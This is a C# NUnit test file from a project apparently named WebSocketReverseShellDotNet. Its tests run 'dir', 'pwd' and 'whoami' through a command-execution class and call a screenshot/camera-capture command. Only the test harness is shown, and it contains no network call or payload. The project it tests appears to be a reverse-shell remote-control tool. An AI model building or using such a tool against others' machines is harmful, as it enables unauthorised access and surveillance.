using NUnit.Framework;
using NUnit.Framework.Legacy;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.service.commands;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.test.commands
{
    [TestFixture]
    internal class CommandsTests
    {

        [Test]
        public void SystemCommand_ValidInput_ReturnsList()
        {
            service.Command command = new SystemCommand();

            String output = command.ExecuteCommand("dir");
            Console.WriteLine(output);
            output = command.ExecuteCommand("pwd");
            Console.WriteLine(output);

            output = command.ExecuteCommand("whoami");
            Console.WriteLine(output);
            ClassicAssert.NotNull(output);

        }

        [Test]
        public void ScreenShot_ValidInput_ReturnsList()
        {
            CameraScreenShot command = new CameraScreenShot();

            String output = command.ExecuteCommand("dir");
            Console.WriteLine(output);
            //output = command.ExecuteCommand("pwd");
            //Console.WriteLine(output);

            //output = command.ExecuteCommand("whoami");
            //Console.WriteLine(output);
            //ClassicAssert.NotNull(output);

        }

    }
}
